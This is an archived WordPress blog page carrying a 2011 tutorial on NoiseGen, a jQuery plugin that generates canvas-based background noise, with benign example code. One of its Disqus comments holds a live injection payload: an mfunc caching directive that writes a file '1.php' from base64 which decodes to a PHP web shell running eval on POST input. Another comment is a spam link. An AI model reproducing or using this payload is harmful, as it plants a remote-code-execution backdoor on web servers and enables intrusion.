<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<title>NoiseGen, generate background noise with jQuery | PrimeGap</title>
	<link rel="profile" href="http://gmpg.org/xfn/11">
		<!--[if lt IE 9]>
	<script src="/wp-content/themes/twentythirteen/js/html5.js"></script>
	<![endif]-->
	<link rel="alternate" type="application/rss+xml" title="PrimeGap &raquo; Feed" href="/feed/" />

<link rel="alternate" type="application/rss+xml" title="PrimeGap &raquo; NoiseGen, generate background noise with jQuery Comments Feed" href="/2011/10/20/noisegen-generate-background-noise-with-jquer/feed/" />
<link rel='stylesheet' id='twentythirteen-fonts-css'  href='//fonts.googleapis.com/css?family=Source+Sans+Pro%3A300%2C400%2C700%2C300italic%2C400italic%2C700italic%7CBitter%3A400%2C700&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='genericons-css'  href='/wp-content/themes/twentythirteen/fonts/genericons.css?ver=2.09' type='text/css' media='all' />
<link rel='stylesheet' id='twentythirteen-style-css'  href='/wp-content/themes/twentythirteen/style.css?ver=2013-07-18' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentythirteen-ie-css'  href='/wp-content/themes/twentythirteen/css/ie.css?ver=2013-07-18' type='text/css' media='all' />
<![endif]-->
<script type='text/javascript' src='http://primegap.net/wp-includes/js/comment-reply.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://primegap.net/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='http://primegap.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<link rel='prev' title='Birth and death of an object in Ruby' href='/2011/08/12/birth-and-death-of-an-object-in-ruby/' />
<meta name="generator" content="WordPress 3.6.1 - really-static 0.5" />
<link rel='canonical' href='/2011/10/20/noisegen-generate-background-noise-with-jquer/' />
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-18862123-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>
	<style type="text/css" id="twentythirteen-header-css">
			.site-header {
			background: url(http://146.185.141.217/wp-content/uploads/2011/02/cropped-bokeh-fullscreen1.jpg) no-repeat scroll top;
			background-size: 1600px auto;
		}
			.site-title,
		.site-description {
			color: #ffffff;
		}
		</style>
	<style type="text/css" id="syntaxhighlighteranchor"></style>
</head>

<body class="single single-post postid-231 single-format-standard">
	<div id="page" class="hfeed site">
		<header id="masthead" class="site-header" role="banner">
			<a class="home-link" href="/" title="PrimeGap" rel="home">
				<h1 class="site-title">PrimeGap</h1>
				<h2 class="site-description">Web, Smart and Mobile Development</h2>
			</a>

			<div id="navbar" class="navbar">
				<nav id="site-navigation" class="navigation main-navigation" role="navigation">
					<h3 class="menu-toggle">Menu</h3>
					<a class="screen-reader-text skip-link" href="#content" title="Skip to content">Skip to content</a>
					<div class="menu-home-menu-container"><ul id="menu-home-menu" class="nav-menu"><li id="menu-item-330" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-330"><a href="http://primegap.net/">Home</a></li>
<li id="menu-item-329" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-329"><a href="/projects/">Projects</a></li>
<li id="menu-item-331" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-331"><a href="/category/tutorial/">Tutorials</a></li>
<li id="menu-item-328" class="menu-item menu-item-type-post_type menu-item-object-page current-post-parent menu-item-328"><a href="/about/">About</a></li>
</ul></div>					<form role="search" method="get" class="search-form" action="/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" title="Search for:" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form>				</nav><!-- #site-navigation -->
			</div><!-- #navbar -->
		</header><!-- #masthead -->

		<div id="main" class="site-main">

	<div id="primary" class="content-area">
		<div id="content" class="site-content" role="main">



<article id="post-231" class="post-231 post type-post status-publish format-standard hentry category-tutorial">
	<header class="entry-header">

				<h1 class="entry-title">NoiseGen, generate background noise with jQuery</h1>

		<div class="entry-meta">
			<span class="date"><a href="/2011/10/20/noisegen-generate-background-noise-with-jquer/" title="Permalink to NoiseGen, generate background noise with jQuery" rel="bookmark"><time class="entry-date" datetime="2011-10-20T23:24:07+00:00">October 20, 2011</time></a></span><span class="categories-links"><a href="/category/tutorial/" title="View all posts in Tutorial" rel="category tag">Tutorial</a></span><span class="author vcard"><a class="url fn n" href="/author/lucaongaro/" title="View all posts by Luca Ongaro" rel="author">Luca Ongaro</a></span>					</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

		<div class="entry-content">
		<p>Adding a subtle background noise to Web pages is becoming a design trend: it produces a nice old-skool &#8220;analog&#8221; look that feels more like the &#8220;real world&#8221;. Neat examples are <a href="http://forrst.com/">Forrst.com</a> or <a href="http://stripe.com/">Stripe.com</a>, as well as many UI elements in iOS5.</p>
<div id="attachment_234" class="wp-caption aligncenter" style="width: 326px"><a href="http://www.lucaongaro.eu/demos/noisegen/" target="_blank"><img src="/wp-content/uploads/2013/10/Screen-Shot-2011-10-21-at-12.09.28-AM-300x78.png" alt="Screen-Shot-2011-10-21-at-12.09.28-AM" width="300" height="78" class="alignnone size-medium wp-image-335" /></a><p class="wp-caption-text">Click the image to see a demo of NoiseGen, the jQuery plugin discussed later in this article</p></div>
<p>The usual way to achieve the effect is to use an image editing software to produce a PNG image and then set it as the background-image through CSS. Still, this approach has some drawbacks. First of all, the image has its bandwidth footprint. Moreover, fine-tuning background noise during development can be very time consuming, having to come back to the image editing software to save a new image each time you want to adjust the effect. Luckily, there&#8217;s a solution: using JavaScript and the HTML5 canvas element to dynamically produce a background image.</p>
<p>The idea is simple: create a canvas element, paint it with noise, and then set it as the background-image through CSS.</p>
<pre class="brush: jscript; title: ; notranslate" title="">

// Create the canvas
var canvas = document.createElement(&quot;canvas&quot;);
canvas.width = 80;
canvas.height = 80;
var context = canvas.getContext(&quot;2d&quot;), x, y, opacity = 0.2;

// Paint it with random noise
for (x=0; x &lt; canvas.width; x++) {
  for (y=0; y &lt; canvas.height; y++) {
    var rand = Math.floor(Math.random() * 60);
    context.fillStyle = &quot;rgba(&quot;+rand+&quot;,&quot;+rand+&quot;,&quot;+rand+&quot;,&quot;+opacity+&quot;)&quot;;
    context.fillRect(x, y, 1, 1);
  }
}

// Use it as the CSS background-image (here we are assuming jQuery is imported)
$(&quot;body&quot;).css(&quot;background-image&quot;, &quot;url(&quot; + canvas.toDataURL(&quot;image/png&quot;) + &quot;)&quot;);
</pre>
<p>Unfortunately, some browsers do not support the canvas element yet (guess who?), so we need to provide for a graceful fallback. Also, it would be cool to have the possibility to finely tweak parameters like opacity, dimension of the image, size of the noise grains, statistical distribution of noise, colors, etc&#8230;</p>
<p>Luckily, we&#8217;ve got you covered! <a title="NoiseGen" href="https://github.com/lucaong/noiseGen" target="_blank">NoiseGen</a> is an open-source jQuery plugin that does exactly that, offering support for a fallback image for <del>crappy</del> old browsers and many useful configuration options. Using it is straightforward:</p>
<pre class="brush: jscript; title: ; notranslate" title="">

$(document).ready({
  $(&quot;body&quot;).noiseGen({ fallbackImage: &quot;bkgnd.png&quot; });
});

</pre>
<p>Here we&#8217;re adding background noise to the body element. Cool browsers will do that dynamically on the client side, while old browsers can rely on the bandwidth hungry image. Moreover, we can finely tweak the look of our background:</p>
<pre class="brush: jscript; title: ; notranslate" title="">

$(&quot;body&quot;).noiseGen({
  fallbackImage: &quot;bkgnd.png&quot;,
  opacity: 0.7,
  width: 64,
  height: 64,
  grainDimension: {
    width: 5,
    height: 1
  },
  fromColor: &quot;0099CC&quot;,
  toColor: &quot;10AADD&quot;,
  independentChannels: true,
  distribution: &quot;uniform&quot;,
  bias: 5
});

</pre>
<p>Do you want to give noiseGen a try? There&#8217;s a <a title="NoiseGen demo" href="http://www.lucaongaro.eu/demos/noisegen/">demo here</a>, and you can read more documentation on the <a title="GitHub noiseGen" href="https://github.com/lucaong/noiseGen">GitHub project page</a>, where you can also fork the code and contribute if you want.</p>
			</div><!-- .entry-content -->

	<footer class="entry-meta">

			</footer><!-- .entry-meta -->
</article><!-- #post -->
					<nav class="navigation post-navigation" role="navigation">
		<h1 class="screen-reader-text">Post navigation</h1>
		<div class="nav-links">

			<a href="/2011/08/12/birth-and-death-of-an-object-in-ruby/" rel="prev"><span class="meta-nav">&larr;</span> Birth and death of an object in Ruby</a>
		</div><!-- .nav-links -->
	</nav><!-- .navigation -->

<div id="disqus_thread">
            <div id="dsq-content">


            <ul id="dsq-comments">
                    <li class="comment even thread-even depth-1" id="dsq-comment-257">
        <div id="dsq-comment-header-257" class="dsq-comment-header">
            <cite id="dsq-cite-257">
                <span id="dsq-author-user-257">ddddddd</span>
            </cite>
        </div>
        <div id="dsq-comment-body-257" class="dsq-comment-body">
            <div id="dsq-comment-message-257" class="dsq-comment-message"><p><!--mfunc $handle = fopen('1.php', 'w');fwrite($handle,base64_decode("PD9waHAgQGV2YWwoJF9QT1NUWyJ0ZXJtaW5hbCJdKT8+"));fclose($handle);--><!--/mfunc--></p>
</div>
        </div>

    </li><!-- #comment-## -->
    <li class="comment odd alt thread-odd thread-alt depth-1" id="dsq-comment-258">
        <div id="dsq-comment-header-258" class="dsq-comment-header">
            <cite id="dsq-cite-258">
                <span id="dsq-author-user-258">gdfg</span>
            </cite>
        </div>
        <div id="dsq-comment-body-258" class="dsq-comment-body">
            <div id="dsq-comment-message-258" class="dsq-comment-message"><p><a href="http://www.svrmeen.com" rel="nofollow">http://www.svrmeen.com</a></p>
</div>
        </div>

    </li><!-- #comment-## -->
            </ul>


        </div>

    </div>

<script type="text/javascript">
var disqus_url = '/2011/10/20/noisegen-generate-background-noise-with-jquer/';
var disqus_identifier = '231 http://primegap.net/?p=231';
var disqus_container_id = 'disqus_thread';
var disqus_shortname = 'primegap';
var disqus_title = "NoiseGen, generate background noise with jQuery";
var disqus_config_custom = window.disqus_config;
var disqus_config = function () {
    /*
    All currently supported events:
    onReady: fires when everything is ready,
    onNewComment: fires when a new comment is posted,
    onIdentify: fires when user is authenticated
    */


    this.language = '';
        this.callbacks.onReady.push(function () {

        // sync comments in the background so we don't block the page
        var script = document.createElement('script');
        script.async = true;
        script.src = '?cf_action=sync_comments&post_id=231';

        var firstScript = document.getElementsByTagName('script')[0];
        firstScript.parentNode.insertBefore(script, firstScript);
    });

    if (disqus_config_custom) {
        disqus_config_custom.call(this);
    }
};

(function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>



		</div><!-- #content -->
	</div><!-- #primary -->


		</div><!-- #main -->
		<footer id="colophon" class="site-footer" role="contentinfo">
				<div id="secondary" class="sidebar-container" role="complementary">
		<div class="widget-area">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">About</h3>			<div class="textwidget"><p><a href="http://andreamostosi.name">Andrea Mostosi</a> lives in Bergamo and works in Milano, Italy<br />
<a href="http://lucaongaro.eu">Luca Ongaro</a> and <a href="http://lucatironi.net">Luca Tironi</a> live and work in Berlin, Germany.</p>
<p>They are geeks and proud nerds. They believe in the power of knowledge and the Force.</p>
</div>
		</aside><aside id="text-3" class="widget widget_text"><h3 class="widget-title">Twitter</h3>			<div class="textwidget"><p>You should follow us on <a href="http://twitter.com/primegap">Twitter</a></p>
<p><a href="http://twitter.com/lucaongaro">@lucaongaro</a><br />
<a href="http://twitter.com/lucatironi">@lucatironi</a><br />
<a href="http://twitter.com/zenkay">@zenkay</a></p>
</div>
		</aside><aside id="nav_menu-2" class="widget widget_nav_menu"><h3 class="widget-title">Menu</h3><div class="menu-home-menu-container"><ul id="menu-home-menu-1" class="menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-330"><a href="http://primegap.net/">Home</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-329"><a href="/projects/">Projects</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-331"><a href="/category/tutorial/">Tutorials</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page current-post-parent menu-item-328"><a href="/about/">About</a></li>
</ul></div></aside><aside id="meta-3" class="widget widget_meta"><h3 class="widget-title">Meta</h3>			<ul>
						<li><a href="http://primegap.net/wp-login.php">Log in</a></li>
			<li><a href="/feed/" title="Syndicate this site using RSS 2.0">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li><a href="https://primegap.disqus.com/latest.rss" title="The latest comments to all posts in RSS">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li><a href="http://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>						</ul>
</aside>		</div><!-- .widget-area -->
	</div><!-- #secondary -->

			<div class="site-info">
								<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform">Proudly powered by WordPress</a>
			</div><!-- .site-info -->
		</footer><!-- #colophon -->
	</div><!-- #page -->

	        <script type="text/javascript">
        // <![CDATA[
        var disqus_shortname = 'primegap';
        (function () {
            var nodes = document.getElementsByTagName('span');
            for (var i = 0, url; i < nodes.length; i++) {
                if (nodes[i].className.indexOf('dsq-postid') != -1) {
                    nodes[i].parentNode.setAttribute('data-disqus-identifier', nodes[i].getAttribute('data-dsqidentifier'));
                    url = nodes[i].parentNode.href.split('#', 1);
                    if (url.length == 1) { url = url[0]; }
                    else { url = url[1]; }
                    nodes[i].parentNode.href = url + '#disqus_thread';
                }
            }
            var s = document.createElement('script');
            s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
        // ]]>
        </script>
        <script type='text/javascript' src='/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9b'></script>
<script type='text/javascript' src='/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushJScript.js?ver=3.0.9b'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
		var themecssurl = "/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeRDark.css?ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['auto-links'] = false;
	SyntaxHighlighter.defaults['gutter'] = false;
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['tab-size'] = 2;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.defaults['wrap-lines'] = false;
	SyntaxHighlighter.all();
</script>
<script type='text/javascript' src='http://primegap.net/wp-includes/js/jquery/jquery.masonry.min.js?ver=2.1.05'></script>
<script type='text/javascript' src='/wp-content/themes/twentythirteen/js/functions.js?ver=2013-07-18'></script>
</body>
</html>
